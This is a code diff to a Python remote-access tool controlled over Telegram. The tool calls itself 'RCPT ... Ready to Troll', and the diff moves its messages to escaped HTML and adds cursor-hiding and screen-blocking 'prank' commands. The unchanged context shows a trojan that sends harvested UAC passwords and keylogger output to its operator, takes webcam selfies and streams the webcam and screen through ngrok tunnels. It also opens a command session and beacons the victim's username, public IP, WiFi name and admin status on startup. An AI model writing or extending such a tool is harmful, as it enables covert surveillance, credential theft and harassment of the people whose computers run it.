@@ -14,6 +14,7 @@ __version__ = "2.65.0" # I kinda forget about this every 10 commits but its kind
 
 
 #TELEGRAM
+import html
 import requests
 from telepot import Bot, glance
 from telepot.loop import MessageLoop
@@ -113,7 +114,6 @@ else:
     print(f"Error: DLLS directory not does not exist or it was empty: {DLLS_DIR}")
 #UTILS
 from utils import *
-from utils.chat import *
 try:
     from plugins import *
 except ImportError as e:
@@ -485,6 +485,7 @@ class PeppinoTelegram:
 
             # 😈 Pranks & Visuals
             #all the TODO here are basically to add LoadingBarTimedWorker in the Commands who have TODO near to them
+            Command("hidecursor", self.wrapper_for_hide_cursor, "Hides mouse's cursor", "pranks", "Hide Cursor"),
             Command("jumpscare", self.jumpscare, "Trigger random jumpscare.", "pranks", "👻 Jumpscare"),
             Command("jumpscarenoaudio", self.jumpscarenoaudio, "Jumpscare without sound.", "pranks", "😶‍🌫️ Jumpscare noaudio"),
             Command("fakebsod", self.fake_bsod, "Show fake Blue Screen of Death.", "pranks", "💀 Fake BSOD"),
@@ -499,7 +500,7 @@ class PeppinoTelegram:
             Command("disturbed_overlay_random_noise", self.disturbed_overlay_and_random_noise, "Noise overlay + audio.", "pranks", "🌀📻 Video&Sound Disturbance"),#TODO
             Command("whisper_overlay", self.whisper_overlay, "Display creepy whisper overlay.", "pranks", "👻 Red Text Overlay"),
             Command("set_jumpscare_volume", self.setJumpscareVolume, "Set jumpscare's volume.","pranks" , "Set Jumpscare Volume"),
-            Command("block_screen", self.overlay_opencv.run_block_screen, "Block screen", "pranks", "Block Screen"), #TODO
+            Command("block_screen", self.wrapper_block_screen, "Block screen", "pranks", "Block Screen"), #TODO
 
             # 🦑 Misc & Memes
             Command("plankton", self.plankton, "Plankton jumpscare.", "misc", "🦑 Plankton"),
@@ -620,10 +621,10 @@ class PeppinoTelegram:
 
     def ask_yesno(self, custom_message: str = "Confirm action") -> bool:
         prompt = (
-            f"*{custom_message}*\n\n"
+            f"<b>{custom_message}</b>\n\n"
             "Choose your action:\n"
-            "• *y* / *yes* — proceed\n"
-            "• *n* / *no* — abort"
+            "• <b>y</b> / <b>yes</b> — proceed\n"
+            "• <b>n</b> / <b>no</b> — abort"
         )
 
         
@@ -679,7 +680,7 @@ class PeppinoTelegram:
         self.__play_loaded_sound("breath")
 
     def bsend(self, text: str, retries=0, parse_mode:str|None=None, reply_markup=None) -> int|None:
-        print(f"Sending message: retries: {retries} content{text[:50]}...")
+        print(f"Sending message: retries: {retries} content: {text[:50]} {'...' if len(text)>50 else ''}")
         doit = True
         if retries>3:
             return
@@ -692,9 +693,10 @@ class PeppinoTelegram:
                 message_id = self.bot.sendMessage(self.owner_id, text, parse_mode=parse_mode, reply_markup=reply_markup)["message_id"]
                 self.all_session_messages.append(message_id)
                 return message_id
-            raise ConnectionError
+            raise ConnectionError("Connection error: manual connection checking")
         except Exception as e:
-            return self.bsend(text, retries+1)
+            print(f"\nError while sending message: \n{e}\n")
+            return self.bsend(text, retries+1, parse_mode=parse_mode, reply_markup=reply_markup)
     
     def bsendWithMarkdownV2(self, text: str, retries=0, reply_markup=None) -> int|None:
         print(f"Sending MarkdownV2 message: {text[:50]}...")
@@ -768,10 +770,10 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             return
 
         self.cmd_session_active = True
-        self.bsendWithMarkdownV2(
-            "💻 *CMD Session Started*\n"
-            "▫️ `exit` → close session\n"
-            "▫️ `:help` → show commands"
+        self.bsendWithHtml(
+            "💻 <b>CMD Session Started</b>\n"
+            "▫️ <code>exit</code> → close session\n"
+            "▫️ <code>:help</code> → show commands"
         )
 
 
@@ -1061,7 +1063,8 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         for file in uacfiles:
             with open(file, "r") as fi:
                 password = fi.read().strip()
-                self.bsend(f"Password: ||{password}||",parse_mode="MarkdownV2")
+                safe_password = html.escape(password)
+                self.bsendWithHtml(f"Password: <tg-spoiler>{safe_password}</tg-spoiler>")
             remove(file)
 
     def gabinetti(self) -> None:
@@ -1300,7 +1303,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
         except Exception as e:
             loading.fill_and_delete()
-            self.bsend(f"Keylogger error:\n```\n{str(e)}\n```", parse_mode="Markdown")
+            self.bsendWithHtml(
+                f"Keylogger error:\n<pre>{html.escape(str(e))}</pre>"
+            )
 
     def leftclick(self) -> None:
         print("Left mouse click")
@@ -1415,36 +1420,31 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def moused(self) -> None:
         print("Moving mouse down")
-        pos = pg.position()
-        pg.moveTo(pos[0], pos[1]+self.MOUSE_JMP)
+        moused(self.MOUSE_JMP)
 
     def mousel(self) -> None:
         print("Moving mouse left")
-        pos = pg.position()
-        pg.moveTo(pos[0]-self.MOUSE_JMP, pos[1])
+        mousel(self.MOUSE_JMP)
 
     def mouser(self) -> None:
         print("Moving mouse right")
-        pos = pg.position()
-        pg.moveTo(pos[0]+self.MOUSE_JMP, pos[1])
+        mouser(self.MOUSE_JMP)
 
     def mouseu(self) -> None:
         print("Moving mouse up")
-        pos = pg.position()
-        pg.moveTo(pos[0], pos[1]-self.MOUSE_JMP)
+        mouseu(self.MOUSE_JMP)
 
     def mouselock(self, timer: int=6) -> None:
         print(f"Locking mouse for {timer} seconds")
-        bar = self.new_loading_bar(timer, label=f"{emoji_dict['mouse']} Mouselock")
-        if not bar: return
-        start = monotonic()
-        pos = pg.position()
-        time_elapsed = 0
-        while timer > time_elapsed:
-            time_elapsed = monotonic()-start
-            bar.update(time_elapsed)
-            pg.moveTo(pos)
-        bar.fill_and_delete()
+        bar = self.new_loading_bar_timed_worker(
+            label="Mouse Locked",
+            duration=timer,
+            target=lock_mouse_position,
+            on_cancel=unlock_mouse,
+            block_default_cancel=True)
+        bar.start()
+        print("Unlocking mouse")
+        unlock_mouse()
 
     def mainmenu(self):
         print("Opening main menu")
@@ -1582,7 +1582,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def new_loading_bar(self, total: int, autodelete: bool=False, showperc:bool=False, label=None) -> LoadingBar|None:
         print(f"Creating loading bar: {label}, total={total}")
-        if isinstance(str, total):
+        if isinstance(total, str):
             if total.replace(".","").isdigit():
                 total = float(total)
             else:
@@ -1593,22 +1593,33 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.bars.update({id(loadingbar):loadingbar})
         return loadingbar
 
-    def new_loading_bar_timed_worker(self, label: str, duration: int, target: Callable, args: tuple=(), on_cancel: Callable|None=None, block_default_cancel: bool=False) -> LoadingBarTimedWorker:
+    def new_loading_bar_timed_worker(self, label: str, duration: int, target: Callable, args: tuple=(), on_cancel: Callable|None=None, on_complete: Callable|None=None, block_default_cancel: bool=False) -> LoadingBarTimedWorker:
         print(f"Creating loading bar worker: {label}, duration={duration}")
-        if isinstance(str, duration):
+        if isinstance(duration, str):
             if duration.replace(".","").isdigit():
                 duration = float(duration)
             else:
                 self.operation_canceled("LoadingBarTimedWorker was passed a total that was not a valid number")
                 print(f"[LoadingBarTimedWorker] duration was not an float, it was: '{duration}'")
                 return None
-        loadingbar_tw = LoadingBarTimedWorker(label=label,duration=duration, chat_id=self.owner_id, bot=self.bot, target=target, args=args, loading_bar_kwargs={
-            "full_char":self.loading_bar_set[0],
-            "empty_char":self.loading_bar_set[1],
-            "spinner_frames":self.loading_bar_spinner,
-            "spinner_pos":"right",
-            "bar_lenght":10,
-        }, on_cancel=on_cancel, block_default_cancel=block_default_cancel)
+        loadingbar_tw = LoadingBarTimedWorker(
+            label=label,
+            duration=duration,
+            chat_id=self.owner_id,
+            bot=self.bot,
+            target=target,
+            args=args,
+            on_cancel=on_cancel, 
+            on_complete=on_complete,
+            block_default_cancel=block_default_cancel,
+            loading_bar_kwargs={
+                "full_char":self.loading_bar_set[0],
+                "empty_char":self.loading_bar_set[1],
+                "spinner_frames":self.loading_bar_spinner,
+                "spinner_pos":"right",
+                "bar_lenght":10,
+                }, 
+        )
         loadingbar = loadingbar_tw.get_loading_bar()
         self.bars.update({id(loadingbar):loadingbar})
         return loadingbar_tw
@@ -1632,10 +1643,14 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def operation_canceled(self, info: str | None = None) -> None:
         print(f"Operation cancelled: {info=}")
-        message = "🚫 *Operation cancelled*"
+        message = "🚫 <b>Operation cancelled</b>"
         if info:
-            message += f"\n_{info}\\._"
-        self.bsendWithMarkdownV2(message)
+            safe_info = (info.replace("&", "&amp;")
+                            .replace("<", "&lt;")
+                            .replace(">", "&gt;"))
+            message += f"\n<i>{safe_info}</i>"
+
+        self.bsendWithHtml(message)
 
     def parse_audio(self, msg: dict) -> None:
         print("Parsing audio message")
@@ -1706,12 +1721,6 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                         response = response.replace(" ","<SPACE>")
                         args[arg] = response
                     self.parse_command(f"/{command} " + " ".join(args.values()))
-                except Exception as e:
-                    self.bsend(
-                        f"Error parsing command '{text}'\n"
-                        f"```{traceback.format_exc(limit=4)}```",
-                        parse_mode="Markdown"
-                    )
 
             elif command.startswith("PK"):
                 if command == "PK_next_page" and self.process_explorer_menu:
@@ -1779,10 +1788,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             else:
                 self.bsend(f"Invalid command {command}")
         except Exception as e:
-            self.bsend(
-                f"Error parsing command '{text}'\n"
-                f"```{traceback.format_exc(limit=4)}```",
-                parse_mode="Markdown"
+            self.bsendWithHtml(
+                f"Error parsing command '{html.escape(text)}'\n"
+                f"<pre>{html.escape(traceback.format_exc(limit=4))}</pre>"
             )
     
     def parse_video_note(self, saved_filepath: str, document: Any) -> None:
@@ -1968,7 +1976,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         while self.running:
             for process, checked in self.processmonitorlist.items():
                 if self.check_if_proc_running(process) and not checked:
-                    self.bsendWithMarkdownV2(f"⚠️ *Process Active*\n`{process}`")
+                    self.bsendWithHtml(f"⚠️ <b>Process Active</b>\n<code>{html.escape(process)}</code>")
                     self.processmonitorlist[process]=True
                 elif not(self.check_if_proc_running(process)):
                     self.processmonitorlist[process]=False
@@ -2195,9 +2203,8 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                     remove(f)
 
         except Exception as e:
-            self.bsend(
-                f"Error during webcam recording\n```{str(e)}```",
-                parse_mode="Markdown"
+            self.bsendWithHtml(
+                f"Error during webcam recording\n<pre>{html.escape(str(e))}</pre>"
             )
             if "bar" in locals():
                 bar.fill_and_delete()
@@ -2322,7 +2329,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                     f,
                     caption=caption,
                     reply_markup=reply_markup,
-                    parse_mode="Markdownv2"
+                    parse_mode="HTML"
                 )
                 self.all_session_messages.append(resp["message_id"])
 
@@ -2331,9 +2338,8 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             return True
 
         except Exception as e:
-            self.bsend(
-                f"Error while taking selfie\n```{str(e)}```",
-                parse_mode="Markdown"
+            self.bsendWithHtml(
+                f"Error while taking selfie\n<pre>{html.escape(str(e))}</pre>"
             )
             return False
 
@@ -2543,20 +2549,20 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                 )
                 warning = generate_warning_for_url(self.webcam_and_screen_url)
                 url_md = escape_md(self.webcam_and_screen_url)
-                self.bsendWithMarkdownV2(
-                    f"📸🖥️ *Webcam & Screen Tunnel Started*\n"
-                    f"URL: [{url_md}]({url_md})\n"
-                    f"Password: `{password}`\n"
-                    f"Warning: `{warning}`"
+                self.bsendWithHtml(
+                    f"📸🖥️ <b>Webcam & Screen Tunnel Started</b>\n"
+                    f"URL: <a href=\"{html.escape(url_md)}\">{html.escape(url_md)}</a>\n"
+                    f"Password: <code>{html.escape(password)}</code>\n"
+                    f"Warning: <code>{html.escape(warning)}</code>"
                 )
             else:
                 url_md = escape_md(self.webcam_and_screen_url)
-                self.bsendWithMarkdownV2(
-                    f"📸🖥️ *Webcam & Screen Tunnel Already Running*\n"
-                    f"URL: [{url_md}]({url_md})"
+                self.bsendWithHtml(
+                    f"📸🖥️ <b>Webcam & Screen Tunnel Already Running</b>\n"
+                    f"URL: <a href=\"{html.escape(url_md)}\">{html.escape(url_md)}</a>"
                 )
         else:
-            self.bsendWithMarkdownV2("⚠️ You cannot start the tunnel because no ngrok token was provided.")
+            self.bsendWithHtml("⚠️ You cannot start the tunnel because no ngrok token was provided.")
 
     def start_webcam_tunnel(self) -> None:
         print("Starting webcam tunnel")
@@ -2566,20 +2572,20 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                 self.webcam_url, password = self.tunnelhandler.start_webcam_stream(cap=self.cap)
                 warning = generate_warning_for_url(self.webcam_url)
                 url_md = escape_md(self.webcam_url)
-                self.bsendWithMarkdownV2(
-                    f"📸 *Webcam Tunnel Started*\n"
-                    f"URL: [{url_md}]({url_md})\n"
-                    f"Password: `{password}`\n"
-                    f"Warning: `{warning}`"
+                self.bsendWithHtml(
+                    f"📸 <b>Webcam Tunnel Started</b>\n"
+                    f"URL: <a href=\"{html.escape(url_md)}\">{html.escape(url_md)}</a>\n"
+                    f"Password: <code>{html.escape(password)}</code>\n"
+                    f"Warning: <code>{html.escape(warning)}</code>"
                 )
             else:
                 url_md = escape_md(self.webcam_url)
-                self.bsendWithMarkdownV2(
-                    f"📸 *Webcam Tunnel Already Running*\n"
-                    f"URL: [{url_md}]({url_md})"
+                self.bsendWithHtml(
+                    f"📸 <b>Webcam Tunnel Already Running</b>\n"
+                    f"URL: <a href=\"{html.escape(url_md)}\">{html.escape(url_md)}</a>"
                 )
         else:
-            self.bsendWithMarkdownV2("⚠️ You cannot start the tunnel because no ngrok token was provided.")
+            self.bsendWithHtml("⚠️ You cannot start the tunnel because no ngrok token was provided.")
 
     def start_screen_tunnel(self) -> None:
         print("Starting screen tunnel")
@@ -2589,24 +2595,24 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                 self.screen_url, password = self.tunnelhandler.start_screen_stream()
                 warning = generate_warning_for_url(self.screen_url)
                 url_md = escape_md(self.screen_url)
-                self.bsendWithMarkdownV2(
-                    f"🖥️ *Screen Tunnel Started*\n"
-                    f"URL: [{url_md}]({url_md})\n"
-                    f"Password: `{password}`\n"
-                    f"Warning: `{warning}`"
+                self.bsendWithHtml(
+                    f"🖥️ <b>Screen Tunnel Started</b>\n"
+                    f"URL: <a href=\"{html.escape(url_md)}\">{html.escape(url_md)}</a>\n"
+                    f"Password: <code>{html.escape(password)}</code>\n"
+                    f"Warning: <code>{html.escape(warning)}</code>"
                 )
             else:
                 url_md = escape_md(self.screen_url)
-                self.bsendWithMarkdownV2(
-                    f"🖥️ *Screen Tunnel Already Running*\n"
-                    f"URL: [{url_md}]({url_md})"
+                self.bsendWithHtml(
+                    f"🖥️ <b>Screen Tunnel Already Running</b>\n"
+                    f"URL: <a href=\"{html.escape(url_md)}\">{html.escape(url_md)}</a>"
                 )
         else:
-            self.bsendWithMarkdownV2("⚠️ You cannot start the tunnel because no ngrok token was provided.")
+            self.bsendWithHtml("⚠️ You cannot start the tunnel because no ngrok token was provided.")
 
     def send_prompt(self, question: str, timeout: int = 30, delete: bool = False) -> str|None:
         print(f"Sending prompt: {question}")
-        msgid = self.bsendWithMarkdownV2(question)
+        msgid = self.bsendWithHtml(question)
         self.user["status"]="input_requested"
         self.user["last_response"]=None
         start = monotonic()
@@ -2672,16 +2678,17 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         STARTING_LOG_MESSAGE.edit("GETTING BASIC INFO AND WEBCAM SELPHIE")
 
         botstartedmessage = (
-            "🚀 *RCPT Online \\- Ready to Troll* 🚀\n\n"
-            f"🕒 *Started*: `{now()}`\n"
-            f"👤 *User*: `{getlogin()}`\n"
-            f"🛡️ *Admin*: `{'YES ✅' if self.has_admin else 'NO ❌'}`\n"
-            f"🌐 *Public IP*: `{public_ip}`\n"
-            f"📡 *WiFi*: `{get_wifi_name()}`\n"
-            f"📸 *Webcam*: `{check_webcam()}`\n"
-            f"💻 *OS*: `{platform.system()} {platform.release()} ({platform.machine()})`\n"
-            f"🔋 *CPU Load*: `{psutil.cpu_percent():.1f}%` \\| *RAM*: `{psutil.virtual_memory().percent:.1f}%`\n\n"
-            "🔥 Bot is live and waiting for commands\\! Use /help or /menu\\."
+            "🚀 <b>RCPT Online – Ready</b> 🚀\n\n"
+            f"🕒 <b>Started:</b> <code>{html.escape(now())}</code>\n"
+            f"👤 <b>User:</b> <code>{html.escape(getlogin())}</code>\n"
+            f"🛡️ <b>Admin:</b> <code>{'YES ✅' if self.has_admin else 'NO ❌'}</code>\n"
+            f"🌐 <b>Public IP:</b> <code>{html.escape(public_ip)}</code>\n"
+            f"📡 <b>WiFi:</b> <code>{html.escape(get_wifi_name())}</code>\n"
+            f"📸 <b>Webcam:</b> <code>{html.escape(check_webcam())}</code>\n"
+            f"💻 <b>OS:</b> <code>{platform.system()} {platform.release()} ({platform.machine()})</code>\n"
+            f"🔋 <b>CPU Load:</b> <code>{psutil.cpu_percent():.1f}%</code> | <b>RAM:</b> <code>{psutil.virtual_memory().percent:.1f}%</code>\n\n"
+            "🔥 <b>Bot is live</b> and ready to receive commands.\n"
+            "Use /help or /menu to see available options."
         )
 
         try:
@@ -2717,13 +2724,44 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.clear()
             self.bsend("🛑 Interrupted by you, bye bye.")
             self.stop_all_tunnels()
+            reset_mouse_controller_and_visibility()
             sys.exit()
         else:
             self.operation_canceled()
 
     def test(self) -> None: #this is a test command used for test purpuses, can be used with /test
         print("Running test")
-        ...
+        message = """
+        <b>Bold</b>
+        <strong>Strong Bold</strong>
+
+        <i>Italic</i>
+        <em>Emphasis</em>
+
+        <u>Underline</u>
+
+        <s>Strikethrough</s>
+        <del>Deleted Text</del>
+
+        <tg-spoiler>Spoiler Text</tg-spoiler>
+
+        <code>Inline code</code>
+
+        <pre>Plain code block
+        line 2
+        line 3</pre>
+
+        <pre><code class="language-python">
+        def hello():
+            print("Hello World")
+        </code></pre>
+
+        <a href="https://example.com">Clickable Link</a>
+
+        <a href="tg://user?id=123456789">User Mention by ID</a>
+        """
+        self.bsendWithHtml(message)
+
 
     def update_commands(self) -> bool:
         print("Updating commands")
@@ -2737,16 +2775,16 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         return response.status_code == 200
 
     def user_prompt(self, question: str, title="Question") -> str:
-        msgid = self.bsendWithMarkdownV2(
-            f"🗣️ *Asking*\n"
-            f">> _{question}_"
+        msgid = self.bsendWithHtml(
+            f"🗣️ <b>Asking</b>\n"
+            f">&gt;&gt; <i>{html.escape(question)}</i>"
         )
         res = user_prompt(question, title)
         self.delete_message(msgid)
-        self.bsendWithMarkdownV2(
-            f"🗣️ *User Response*\n\n"
-            f"*You:* _{question}_\n"
-            f"*User:* _{res}_"
+        self.bsendWithHtml(
+            f"🗣️ <b>User Response</b>\n\n"
+            f"<b>You:</b> <i>{html.escape(question)}</i>\n"
+            f"<b>User:</b> <i>{html.escape(res)}</i>"
         )
 
         return res
@@ -2785,6 +2823,35 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                                                 target=self.overlay_opencv.run_disturbance_effect,
                                                 args=(timeout_seconds, ),
                                                 on_cancel=custom_oncancel)
+        if not bar: return
+        bar.start()
+
+    def wrapper_for_hide_cursor(self, timeout: int) -> None:
+        print("Hiding cursor")
+        se = Event()
+        bar = self.new_loading_bar_timed_worker(
+            label="Hide Mouse Cursor",
+            duration=timeout,
+            target=lambda:...,
+            on_cancel=se.set,
+            on_complete=se.set,
+            block_default_cancel=True
+        )
+        if not bar: return
+        print("Hiding all cursor")
+        hide_all_cursors()
+        print("Enforcing mouse lock")
+        Thread(target=enforce_lock, args=(se, )).start()
+        bar.start()
+        print("Resetting mouse controller and visibility.")
+        reset_mouse_controller_and_visibility()#always ensuring this is done
+
+    def wrapper_block_screen(self, timeout: int) -> None:
+        bar = self.new_loading_bar_timed_worker(target=self.overlay_opencv.run_block_screen,
+                                          label="Blocking Screen",
+                                          duration=timeout,
+                                          on_cancel=self.overlay_opencv.setstop,
+                                          args=(timeout, )) 
         if not bar: return
         bar.start()
 
